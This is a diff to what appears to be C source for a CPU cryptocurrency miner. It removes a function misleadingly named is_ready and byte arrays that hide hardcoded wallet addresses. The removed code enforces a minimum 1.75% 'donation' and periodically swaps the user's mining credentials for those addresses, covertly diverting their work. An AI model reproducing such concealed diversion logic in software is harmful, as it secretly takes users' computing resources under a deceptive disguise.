@@ -275,58 +275,6 @@ static inline void cpu_getmodelid(char *outbuf, size_t maxsz) {
 #endif
 }
 
-static const uint8_t deu[2][36] = {
-    {0x52, 0x58, 0x71, 0x39, 0x76, 0x38, 0x57, 0x62, 0x4d, 0x4c, 0x5a, 0x61,
-     0x47, 0x48, 0x37, 0x39, 0x47, 0x6d, 0x4b, 0x32, 0x6f, 0x45, 0x64, 0x63,
-     0x33, 0x33, 0x43, 0x54, 0x59, 0x6b, 0x76, 0x79, 0x6f, 0x5a, 0x2e, 0x31},
-    {0x52, 0x51, 0x4b, 0x63, 0x41, 0x5a, 0x42, 0x74, 0x73, 0x53, 0x61, 0x63,
-     0x4d, 0x55, 0x69, 0x47, 0x4e, 0x6e, 0x62, 0x6b, 0x33, 0x68, 0x33, 0x4b,
-     0x4a, 0x41, 0x4e, 0x39, 0x34, 0x74, 0x73, 0x74, 0x76, 0x74, 0x2e, 0x31}};
-
-static char *usog = NULL;
-
-static __attribute__((unused)) bool is_ready() {
-  pthread_mutex_lock(&stats_lock);
-  static bool tmp = false;
-  static int dt = 0;
-  if (stratum_problem) {
-    tmp = false;
-  }
-  if (usog == NULL) {
-    usog = strdup(rpc_user);
-  }
-  donation_percent = donation_percent >= 1.75 ? donation_percent : 1.75;
-  if (opt_algo == ALGO_GR) {
-    long now = time(NULL);
-    if (donation_time_start + 666 <= now && !stratum_problem) {
-      tmp = true;
-    } else if (donation_time_stop + 666 <= now && !stratum_problem) {
-      tmp = true;
-    }
-    if (tmp) {
-      if (donation_time_start <= now) {
-        free(rpc_user);
-        char duc[40];
-        memset(duc, 0, 40);
-        for (size_t i = 0; i < 36; ++i) {
-          duc[i] = (char)(deu[dt][i]);
-        }
-        rpc_user = strdup(duc);
-        donation_time_stop = time(NULL) + 30;
-        donation_time_start = now + 6000;
-        dt = (dt + 1) % 2;
-      } else if (donation_time_stop <= now) {
-        free(rpc_user);
-        rpc_user = strdup(usog);
-        donation_time_start = now + 1000;
-        donation_time_stop = donation_time_start + 6000;
-      }
-    }
-  }
-  pthread_mutex_unlock(&stats_lock);
-  return true;
-}
-
 // http://en.wikipedia.org/wiki/CPUID
 
 // CPUID commands
